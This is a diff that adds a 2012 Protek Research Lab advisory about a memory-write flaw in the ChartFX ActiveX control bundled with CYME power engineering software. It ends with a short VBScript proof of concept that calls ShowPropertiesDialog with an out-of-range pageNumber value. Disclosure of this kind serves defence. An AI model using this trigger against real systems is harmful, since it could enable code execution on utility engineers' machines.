@@ -1,0 +1,81 @@
+#####################################################################################
+
+Application:   CYME Power Engineering Software
+
+Platforms:   Windows
+Version:   CYME version 5.0.12.663.
+
+Secunia: SA48430
+
+{PRL}:   2012-29
+
+Author:   Francis Provencher (Protek Research Lab's) 
+
+Website:   http://www.protekresearchlab.com/
+
+Twitter:   @ProtekResearch
+
+
+#####################################################################################
+
+1) Introduction
+2) Report Timeline
+3) Technical details
+4) The Code
+
+
+#####################################################################################
+
+===============
+1) Introduction
+===============
+
+The CYME Power Engineering software is a suite of applications composed of a network editor, analysis
+modules and user-customizable model libraries from which you can choose to get the most powerful solution. 
+
+The modules available comprise a variety of advanced applications and extensive libraries for either
+transmission/industrial or distribution power network analysis.
+ 
+(http://www.cyme.com/software/)
+ 
+This software is use by all major electrical production/distrubtion company
+http://www.cyme.com/company/clients/
+ 
+#####################################################################################
+
+============================
+2) Report Timeline
+============================
+
+2012-03-14  Vulnerability reported to Secunia
+2012-10-03  Publication of this advisory (180 Days)
+
+
+#####################################################################################
+
+============================
+3) Technical details
+============================
+The vulnerability is caused due to an indexing error in the "ShowPropertiesDialog()"
+method (ChartFX.ClientServer.Core.dll) of the ChartFX ActiveX Control. This can be
+exploited to write a single byte value to an arbitrary memory location via the
+"pageNumber" parameter. Successful exploitation may allow execution of arbitrary code.
+
+
+#####################################################################################
+
+===========
+4) The Code
+===========
+<object classid='clsid:E9DF30CA-4B30-4235-BF0C-7150F646606C' id='target' />
+<script language='vbscript'>
+targetFile = "C:\CYME\CYMDIST50TRIAL\ChartFX.ClientServer.Core.dll"
+prototype = "Sub ShowPropertiesDialog ( ByVal context As Variant , ByVal pageNumber As Long )"
+memberName = "ShowPropertiesDialog"
+progid = "Cfx62ClientServer.Chart"
+argCount = 2
+ 
+arg1="defaultV"
+arg2=2147483647
+ 
+target.ShowPropertiesDialog arg1 ,arg2
